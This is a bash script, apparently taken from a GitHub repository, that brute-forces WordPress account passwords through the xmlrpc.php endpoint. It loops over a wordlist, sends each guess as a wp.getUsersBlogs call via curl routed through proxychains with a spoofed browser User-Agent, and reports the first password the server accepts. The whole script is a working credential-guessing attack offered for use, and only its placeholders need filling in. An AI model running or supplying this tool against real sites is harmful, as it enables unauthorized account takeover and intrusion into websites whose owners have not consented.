#!/bin/bash
# AlexanderSarango
#https://github.com/Alexander-sarango/wp-xmlrpc-bruteforce
# Maneja Ctrl+C
function ctrl_c() {
  echo -e "\n\n[!] Saliendo..."
  exit 1
}
trap ctrl_c SIGINT

# Configuración
username="----------USUARIO ENCONTRADO CON WPSCAM-------------"
url="https://tu-sitio-web.com/xmlrpc.php"
wordlist="ruta/a/tu/archivo-de-contraseñas.txt"

function createXML() {
  password="$1"
  xmlFile="<?xml version=\"1.0\" encoding=\"UTF-8\"?>
<methodCall>
  <methodName>wp.getUsersBlogs</methodName>
  <params>
    <param><value>$username</value></param>
    <param><value>$password</value></param>
  </params>
</methodCall>"
  echo "$xmlFile" > file.xml

  echo "Probando contraseña: $password"

  response=$(proxychains curl -s -X POST "$url" \
    --header "Content-Type: application/xml" \
    --header "User-Agent: Mozilla/5.0" \
    --data-binary @file.xml)

  # Detecta fallo o éxito
  if echo "$response" | grep -q -i "incorrect"; then
    echo "[-] Contraseña incorrecta: $password"
  elif echo "$response" | grep -q -i "403"; then
    echo "[-] Acceso denegado o IP bloqueada"
  elif echo "$response" | grep -q -i "<methodResponse>"; then
    echo -e "\n ¡Contraseña válida encontrada!: $password"
    echo "Respuesta del servidor:"
    echo "$response"
    exit 0
  else
    echo "[-] Respuesta inesperada, continuar..."
  fi

  sleep 1
}

# Verifica diccionario
if [[ ! -f "$wordlist" ]]; then
  echo " No se encontró el diccionario en: $wordlist"
  exit 1
fi

# Itera y prueba cada contraseña
while read -r password; do
  createXML "$password"
done < "$wordlist"
